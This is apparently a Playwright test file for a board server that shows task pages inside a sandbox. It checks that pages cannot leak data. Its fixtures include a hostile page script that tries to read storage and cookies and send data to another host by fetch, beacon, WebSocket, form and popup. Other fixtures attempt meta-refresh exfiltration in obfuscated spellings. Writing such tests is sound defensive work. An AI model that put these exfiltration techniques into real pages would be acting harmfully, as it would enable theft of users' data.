import "./test-env.mjs";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer as createHttpServer } from "node:http";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";
import { createBoardServer, loadBoardApp } from "../packages/sage-board/server.mjs";
import { renderMessage } from "../packages/sage-core/message-checks.mjs";
import { SWITCH_SCRIPT } from "../packages/sage-core/message-page.mjs";

const require = createRequire(import.meta.url);
const { chromium } = require("playwright");
const HERE = dirname(fileURLToPath(import.meta.url));
const HEADERS = ["id title size risk route state branch pr round keys", "id task role round candidate branch status tokens report started ended", "task key round source severity summary triage reason status", "task pr sha kind cycle run at", "id task question options recommendation default answer at", "at task decision why"];
const NAMES = ["tasks", "runs", "findings", "ledger", "gates", "decisions"];
const LOGBOOK = "project-abcdef";
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
const shown = (frame, selector) => frame.locator(selector).evaluate((img) => img.complete && img.naturalWidth > 0);
const tabs = (images) => `<!DOCTYPE html><title>SAMPLE design</title>
<button id="a" aria-pressed="true">One</button><button id="b" aria-pressed="false">Two</button>
<section id="one">SAMPLE tab one</section><section id="two" hidden>SAMPLE tab two</section>
${images}
<script>
for (const [id, show] of [["a", "one"], ["b", "two"]]) document.getElementById(id).addEventListener("click", () => {
  for (const s of document.querySelectorAll("section")) s.hidden = s.id !== show;
  for (const b of document.querySelectorAll("button")) b.setAttribute("aria-pressed", String(b.id === id));
});
</script>`;

const dir = mkdtempSync(join(realpathSync(tmpdir()), "sage-board-pages-browser-"));
const book = join(dir, "source", LOGBOOK), pages = join(dir, "worktrees", LOGBOOK, "pages", "T1");
mkdirSync(book, { recursive: true });
NAMES.forEach((table, i) => writeFileSync(join(book, `${table}.tsv`), `${HEADERS[i].replaceAll(" ", "\t")}\n`));
writeFileSync(join(book, "tasks.tsv"), `${HEADERS[0].replaceAll(" ", "\t")}\nT1\tSample task\tsmall\t\tbuild\tframed\tsample/t1\t\t0\t\n`);
mkdirSync(pages, { recursive: true });

let browser, board, boardPort, other, otherPort, before_;
const reached = [];
const heard = new Map();
const at = (path) => `http://127.0.0.1:${boardPort}/pages/${LOGBOOK}/T1/${path}`;

const hostile = (other) => `<!DOCTYPE html><html><head><title>SAMPLE hostile page</title><link rel="stylesheet" href="${other}/style"><script src="${other}/script"></script></head><body>
<p id="out">no script ran</p><img src="${other}/image" alt=""><img src="/pages/${LOGBOOK}/T1/research.html" alt="">
<a id="top" target="_top" href="${other}/link-top">top</a> <a id="self" href="${other}/link-self">self</a> <button id="go-top">top</button> <button id="go-self">self</button>
<form id="form" method="post" action="${other}/form"><input name="data" value="SAMPLE secret"></form>
<script>
(async () => {
  const out = [];
  document.body.dataset.ran = "yes";
  try { out.push("storage read: " + localStorage.getItem("sage-sample")); } catch (e) { out.push("storage: " + e.name); }
  try { out.push("cookie read: " + document.cookie); } catch (e) { out.push("cookie: " + e.name); }
  for (const [name, url] of [["board", "${at("research.html").replace(/\/pages\/.*$/, "/")}"], ["page", "${at("research.html")}"], ["other", "${other}/fetch"]]) {
    try { const r = await fetch(url); out.push("fetch " + name + ": " + r.status); } catch (e) { out.push("fetch " + name + ": " + e.name); }
  }
  try { new WebSocket("${other.replace("http", "ws")}/socket"); out.push("socket: made"); } catch (e) { out.push("socket: " + e.name); }
  try { navigator.sendBeacon("${other}/beacon", "SAMPLE"); out.push("beacon: sent"); } catch (e) { out.push("beacon: " + e.name); }
  try { const w = window.open("${other}/popup"); out.push("popup: " + (w ? "opened" : "blocked")); } catch (e) { out.push("popup: " + e.name); }
  try { document.getElementById("form").submit(); out.push("form: submitted"); } catch (e) { out.push("form: " + e.name); }
  try { top.location.href = "${other}/top"; out.push("top: moved"); } catch (e) { out.push("top: " + e.name); }
  document.getElementById("out").textContent = out.join("; ");
  document.body.dataset.done = "yes";
  document.getElementById("go-top").addEventListener("click", () => { try { top.location.href = "${other}/click-top"; document.body.dataset.top = "moved"; } catch (e) { document.body.dataset.top = e.name; } });
  document.getElementById("go-self").addEventListener("click", () => { location.href = "${other}/click-self"; });
})();
</script></body></html>`;

before(async () => {
  other = createHttpServer((request, response) => {
    if (request.url === "/" || request.url === "/auto") {
      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      return response.end(`<!DOCTYPE html><title>other site</title><a id="go" href="${at("research.html")}">page</a> <a id="script" href="${at("hostile.html")}">a page with a script</a> <a id="index" target="_blank" rel="opener" href="${at("")}">index</a>${request.url === "/auto" ? `<script>setTimeout(() => { location.href = ${JSON.stringify(at("research.html"))}; }, 50)</script>` : ""}`);
    }
    reached.push(request.url); heard.set(request.url, request.headers);
    response.writeHead(204); response.end();
  });
  await new Promise((accept) => other.listen(0, "127.0.0.1", accept));
  otherPort = other.address().port;
  before_ = process.env.SAGE_WORKTREES;
  process.env.SAGE_WORKTREES = join(dir, "worktrees");
  board = createBoardServer({ sources: [{ id: "sample", path: join(dir, "source") }], port: 0, app: loadBoardApp(fileURLToPath(new URL("../plugins/sage/board/app", import.meta.url))) });
  ({ port: boardPort } = await board.start());
  const otherSite = `http://localhost:${otherPort}`;
  writeFileSync(join(pages, "hostile.html"), hostile(otherSite));
  writeFileSync(join(pages, "refresh.html"), `<!DOCTYPE html><title>SAMPLE</title><meta http-equiv="refresh" content="0; url=${otherSite}/refresh?data=SAMPLE"><p>SAMPLE refresh</p>`);
  writeFileSync(join(pages, "research.html"), "<!DOCTYPE html><title>SAMPLE research</title><p>SAMPLE research page</p>");
  writeFileSync(join(pages, "notes.txt"), "SAMPLE notes");
  writeFileSync(join(pages, "links.html"), `<!DOCTYPE html><title>SAMPLE links</title><a id="index" href="${at("")}">index</a> <a id="txt" href="${at("notes.txt")}">notes</a> <a id="script" href="${at("hostile.html")}">a page with a script</a>`);
  mkdirSync(join(pages, "designs", "final", "shots"), { recursive: true });
  writeFileSync(join(pages, "designs", "final", "shots", "x.png"), PNG);
  mkdirSync(join(dir, "worktrees", LOGBOOK, "pages", "T2"));
  writeFileSync(join(dir, "worktrees", LOGBOOK, "pages", "T2", "x.png"), PNG);
  const images = `<img id="shot" src="shots/x.png" alt="SAMPLE shot"><img id="data" src="data:image/png;base64,${PNG.toString("base64")}" alt=""><img id="task" src="/pages/${LOGBOOK}/T2/x.png" alt=""><img id="away" src="${otherSite}/image" alt="">`;
  writeFileSync(join(pages, "designs", "final", "tabs.html"), tabs(`${images}<a id="sibling" href="../../research.html">research</a>`));
  writeFileSync(join(pages, "designs", "final", "shots.html"), `<!DOCTYPE html><title>SAMPLE shots</title>${images}`);
  const design = JSON.parse(readFileSync(join(HERE, "fixtures", "messages", "07-design.json"), "utf8"));
  const message = renderMessage({ ...design, blocks: design.blocks.map((b) => (b.t === "page" ? { ...b, path: `/pages/${b.task}/${b.file}` } : b)) }, { pagePath: (name) => join(pages, name) });
  assert.ok(message.page, "the design message has a page");
  writeFileSync(join(pages, "design.html"), message.page.html);
  const refresh = (meta) => message.page.html.replace("<title>", `${meta}<title>`);
  writeFileSync(join(pages, "switch-refresh.html"), refresh(`<meta http-equiv="refresh" content="0;url=${otherSite}/switch-refresh?data=SAMPLE">`));
  writeFileSync(join(pages, "switch-odd.html"), refresh(`<META\n  HTTP-EQUIV = 'Refresh' CONTENT='0;url=${otherSite}/switch-odd?data=SAMPLE'>`));
  writeFileSync(join(pages, "switch-entity.html"), refresh(`<meta http-equiv=&#x72;efresh content=0;url=${otherSite}/switch-entity?data=SAMPLE>`));
  writeFileSync(join(pages, "switch-quote.html"), refresh(`<meta a='<meta http-equiv="Content-Security-Policy" content="' http-equiv=refresh content='0;url=${otherSite}/switch-quote?data=SAMPLE'">`));
  writeFileSync(join(pages, "switch-srcdoc.html"), refresh(`<iframe srcdoc="&lt;meta http&#45;equiv=&quot;refresh&quot; content=&quot;0;url=${otherSite}/switch-srcdoc?data=SAMPLE&quot;&gt;"></iframe>`));
  writeFileSync(join(pages, "prerender.html"), `<!DOCTYPE html><title>SAMPLE</title><link rel="prerender" href="${otherSite}/prerender?data=SAMPLE"><p>SAMPLE prerender</p>`);
  writeFileSync(join(pages, "switch-utf16.html"), Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<!DOCTYPE html><meta http-equiv="refresh" content="0;url=${otherSite}/switch-utf16?data=SAMPLE"><p>SAMPLE</p>`, "utf16le"), Buffer.from(`<script>${SWITCH_SCRIPT}</script>`)]));
  browser = await chromium.launch({ headless: true, ...(process.env.BOARD_BROWSER_PATH ? { executablePath: process.env.BOARD_BROWSER_PATH } : {}) });
});

after(async () => {
  try { await browser?.close(); } finally {
    await board?.close(); await new Promise((accept) => other ? other.close(accept) : accept());
    if (before_ === undefined) delete process.env.SAGE_WORKTREES; else process.env.SAGE_WORKTREES = before_;
    rmSync(dir, { recursive: true, force: true });
  }
});

async function context(t) {
  const ctx = await browser.newContext();
  t.after(() => ctx.close());
  const page = await ctx.newPage();
  assert.equal((await page.goto(`http://127.0.0.1:${boardPort}/app/`)).status(), 200);
  await page.evaluate(() => localStorage.setItem("sage-sample", "SAMPLE board value"));
  return { ctx, page };
}

const inner = async (page) => { await page.waitForLoadState(); return page.mainFrame().childFrames()[0]; };

test("a page with no script of its own opens as it is, and its refresh to another site reaches nothing", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const refresh = await page.goto(at("refresh.html"));
  assert.equal(refresh.status(), 200);
  assert.match(refresh.headers()["content-security-policy"], /^sandbox; /);
  assert.equal(page.mainFrame().childFrames().length, 0, "no frame");
  await page.waitForTimeout(500);
  assert.equal(new URL(page.url()).port, String(boardPort), "the refresh did not move the page");
  assert.deepEqual(reached, [], "nothing reached the other site");
});

test("T1130: a design page's own script switches its tabs, and its pictures from its own folder show", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const errors = [];
  page.on("pageerror", (error) => errors.push(String(error)));
  const response = await page.goto(at("designs/final/tabs.html"));
  assert.equal(response.status(), 200);
  assert.equal(await page.title(), "tabs.html");
  assert.match(await page.getByRole("note").textContent(), /^Warning: This page runs its own scripts in a sandbox/);
  const frame = await inner(page);
  await frame.waitForLoadState();
  assert.equal(await frame.locator("#two").isVisible(), false);
  await frame.locator("#b").click();
  assert.equal(await frame.locator("#two").isVisible(), true, "the second tab shows");
  assert.equal(await frame.locator("#one").isVisible(), false, "the first tab hides");
  assert.equal(await frame.locator("#b").getAttribute("aria-pressed"), "true");
  await frame.locator("#a").click();
  assert.equal(await frame.locator("#one").isVisible(), true, "the first tab shows again");
  assert.equal(await shown(frame, "#shot"), true, "designs/final/shots/x.png shows: 4 parts deep, as standing order 41 keeps a design");
  assert.equal(await shown(frame, "#data"), true, "a data: picture shows");
  assert.equal(await shown(frame, "#task"), false, "a picture of another task does not load");
  assert.equal(await shown(frame, "#away"), false, "a picture of another site does not load");
  assert.deepEqual(reached, [], "nothing reached the other site");
  assert.deepEqual(errors, []);
});

test("F-T1130-1: in a page with scripts, the warning line's link opens the task's index in the top window, and a link to another page of the task opens in the frame", async (t) => {
  const { page } = await context(t);
  await page.goto(at("designs/final/tabs.html"));
  await (await inner(page)).locator("#sibling").click();
  await page.waitForTimeout(300);
  assert.equal((await inner(page)).url(), at("research.html"));
  assert.match(await (await inner(page)).textContent("body"), /SAMPLE research page/);
  assert.equal(page.url(), at("designs/final/tabs.html"), "the top window stays");
  const [index] = await Promise.all([page.waitForResponse(at("")), page.getByRole("note").getByRole("link", { name: "All pages of T1" }).click()]);
  assert.equal(index.status(), 200);
  assert.equal(page.url(), at(""), "the index opens in the top window");
  assert.match(await page.textContent("h1"), /Pages of T1/);
});

test("T1130: a page with no script shows its pictures from its own folder, but no picture of another task or site", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  assert.equal((await page.goto(at("designs/final/shots.html"))).status(), 200);
  assert.equal(page.mainFrame().childFrames().length, 0, "no frame");
  await page.waitForLoadState("load");
  assert.equal(await shown(page.mainFrame(), "#shot"), true, "designs/final/shots/x.png shows: 4 parts deep, as standing order 41 keeps a design");
  assert.equal(await shown(page.mainFrame(), "#task"), false, "a picture of another task does not load");
  assert.equal(await shown(page.mainFrame(), "#away"), false);
  assert.deepEqual(reached, [], "nothing reached the other site");
});

test("T1130: a page's own script runs, but it cannot fetch the board, read its storage or cookies, send a form, open a window, move the top window or reach another site", async (t) => {
  const { ctx, page } = await context(t);
  await ctx.addCookies([{ name: "sample", value: "SAMPLE cookie", url: `http://127.0.0.1:${boardPort}/` }]);
  reached.length = 0;
  const response = await page.goto(at("hostile.html"));
  assert.equal(response.status(), 200);
  const frame = await inner(page);
  await frame.waitForFunction(() => document.body.dataset.done === "yes");
  const out = await frame.locator("#out").textContent();
  assert.match(out, /storage: SecurityError/, out);
  assert.match(out, /cookie: SecurityError/, out);
  assert.match(out, /fetch board: TypeError; fetch page: TypeError; fetch other: TypeError/, out);
  assert.match(out, /popup: blocked/, out);
  assert.match(out, /top: SecurityError/, out);
  await frame.locator("#go-top").click();
  assert.equal(await frame.evaluate(() => document.body.dataset.top), "SecurityError", "a click does not let the script move the top window");
  await frame.locator("#top").click();
  await page.waitForTimeout(300);
  assert.equal(page.url(), at("hostile.html"), "a link to the top window does not move it");
  for (const id of ["#self", "#go-self"]) {
    await page.goto(at("hostile.html"));
    await (await inner(page)).waitForFunction(() => document.body.dataset.done === "yes");
    await (await inner(page)).locator(id).click();
    await page.waitForTimeout(300);
    assert.equal(page.url(), at("hostile.html"), id);
  }
  await page.waitForTimeout(300);
  assert.deepEqual(reached, [], "nothing reached the other site");
  await page.goto(`http://127.0.0.1:${boardPort}/app/`);
  assert.equal(await page.evaluate(() => localStorage.getItem("sage-sample")), "SAMPLE board value");
});

test("a sage message page's Today switch works under the sandbox", async (t) => {
  const { page } = await context(t);
  const errors = [];
  page.on("pageerror", (error) => errors.push(String(error)));
  assert.equal((await page.goto(at("design.html"))).status(), 200);
  const today = page.locator(".tg-bar button[data-v=today]").first();
  await today.click();
  assert.equal(await today.getAttribute("aria-pressed"), "true");
  assert.equal(await page.locator(".tg").first().evaluate((el) => el.classList.contains("show-today")), true);
  assert.equal(await page.locator(".tg-today").first().isVisible(), true);
  assert.equal(await page.locator(".tg-after").first().isVisible(), false);
  assert.deepEqual(errors, []);
});

test("F-T1013-1: a page with sage's switch script and a meta refresh, in any spelling, stays on the Mac and reaches nothing", async (t) => {
  const { page } = await context(t);
  for (const name of ["switch-refresh.html", "switch-odd.html", "switch-entity.html", "switch-quote.html", "switch-srcdoc.html", "switch-utf16.html"]) {
    reached.length = 0;
    const response = await page.goto(at(name));
    assert.equal(response.status(), 200, name);
    await page.waitForTimeout(500);
    assert.deepEqual(reached, [], `${name}: nothing reached the other site`);
    assert.equal(page.url(), at(name), `${name}: the refresh did not move the page`);
    assert.match(response.headers()["content-security-policy"], /^sandbox; /, `${name}: the page runs no script`);
  }
});

test("F-T1013-5: a prerender link in a page with no script can ask another site for its address, with no referrer, and the page stays", async (t) => {
  const { page } = await context(t);
  reached.length = 0;
  const response = await page.goto(at("prerender.html"));
  assert.match(response.headers()["content-security-policy"], /^sandbox; /);
  for (let i = 0; i < 15 && !reached.length; i++) await page.waitForTimeout(100);
  await page.waitForTimeout(300);
  t.diagnostic(`the prerender request ${reached.length ? "reached" : "did not reach"} the other site in this browser`);
  assert.ok(reached.length === 0 || reached.join() === "/prerender?data=SAMPLE", `only the address of the link: ${reached.join()}`);
  if (reached.length) assert.equal(heard.get(reached[0]).referer, undefined, "no referrer");
  assert.equal(page.url(), at("prerender.html"));
});

test("the task index opens its pages, also a page that runs its own script", async (t) => {
  const { page } = await context(t);
  assert.equal((await page.goto(at("")).then((r) => r.status())), 200);
  const [research] = await Promise.all([page.waitForResponse(at("research.html")), page.locator(`a[href="/pages/${LOGBOOK}/T1/research.html"]`).click()]);
  assert.equal(research.status(), 200);
  assert.match(await page.textContent("body"), /SAMPLE research page/);
  await page.goBack();
  const [scripted] = await Promise.all([page.waitForResponse(at("hostile.html")), page.locator(`a[href="/pages/${LOGBOOK}/T1/hostile.html"]`).click()]);
  assert.equal(scripted.status(), 200);
  await (await inner(page)).waitForFunction(() => document.body.dataset.done === "yes");
});

test("F6: a person's click on another site opens a page, also one that runs its own script in the sandbox; a move that no person started does not", async (t) => {
  const { page } = await context(t);
  await page.goto(`http://localhost:${otherPort}/`);
  const [opened] = await Promise.all([page.waitForResponse(at("research.html")), page.click("#go")]);
  assert.equal(opened.request().headers()["sec-fetch-site"] ?? (await opened.request().allHeaders())["sec-fetch-site"], "cross-site");
  assert.equal(opened.status(), 200);
  assert.match(await page.textContent("body"), /SAMPLE research page/);
  await page.goto(`http://localhost:${otherPort}/`);
  reached.length = 0;
  const [script] = await Promise.all([page.waitForResponse(at("hostile.html")), page.click("#script")]);
  assert.equal(script.status(), 200);
  await (await inner(page)).waitForFunction(() => document.body.dataset.done === "yes");
  assert.match(await (await inner(page)).locator("#out").textContent(), /fetch board: TypeError/);
  assert.deepEqual(reached, [], "nothing reached the other site");
  const [auto] = await Promise.all([page.waitForResponse(at("research.html")), page.goto(`http://localhost:${otherPort}/auto`)]);
  assert.equal(auto.status(), 403);
});

test("a click on a link in a page opens another page of the board or the index", async (t) => {
  const { page } = await context(t);
  for (const [id, url, status] of [["#index", at(""), 200], ["#txt", at("notes.txt"), 200], ["#script", at("hostile.html"), 200]]) {
    await page.goto(at("links.html"));
    const [response] = await Promise.all([page.waitForResponse(url), page.click(id)]);
    assert.equal(response.status(), status, id);
  }
});

test("F-T1001-6: the index cuts the handle of another site that opened it, also for a page with a script that it then opens", async (t) => {
  const { ctx, page } = await context(t);
  await page.goto(`http://localhost:${otherPort}/`);
  const [index] = await Promise.all([ctx.waitForEvent("page"), page.click("#index")]);
  await index.waitForLoadState();
  assert.match(await index.textContent("h1"), /Pages of T1/);
  assert.equal(await index.evaluate(() => window.opener === null), true, "the index has no opener");
  await Promise.all([index.waitForURL(at("hostile.html")), index.locator(`a[href="/pages/${LOGBOOK}/T1/hostile.html"]`).click()]);
  await (await inner(index)).waitForFunction(() => document.body.dataset.done === "yes");
  assert.equal(await index.evaluate(() => window.opener === null), true, "the page that runs its scripts has no opener");
});

test("the index's warning is a note that starts with Warning, it has no scripts link, and its small text has a contrast of at least 4.5:1", async (t) => {
  const { page } = await context(t);
  for (const colorScheme of ["light", "dark"]) {
    await page.emulateMedia({ colorScheme });
    await page.goto(at(""));
    const notes = page.getByRole("note");
    assert.equal(await notes.count(), 1, colorScheme);
    assert.match(await notes.textContent(), /^Warning: /);
    assert.equal(await page.getByRole("link", { name: /with its scripts/ }).count(), 0);
    const ratios = await page.evaluate(() => {
      const lum = (color) => { const [r, g, b] = color.match(/[\d.]+/g).slice(0, 3).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
      const probe = document.createElement("div");
      probe.style.background = "Canvas";
      document.body.append(probe);
      const bg = lum(getComputedStyle(probe).backgroundColor);
      probe.remove();
      return [...document.querySelectorAll(".m")].map((el) => { const fg = lum(getComputedStyle(el).color); return (Math.max(fg, bg) + 0.05) / (Math.min(fg, bg) + 0.05); });
    });
    assert.ok(ratios.length >= 2, "the logbook line and the sizes");
    for (const ratio of ratios) assert.ok(ratio >= 4.5, `${colorScheme}: ${ratio.toFixed(2)}:1`);
  }
});
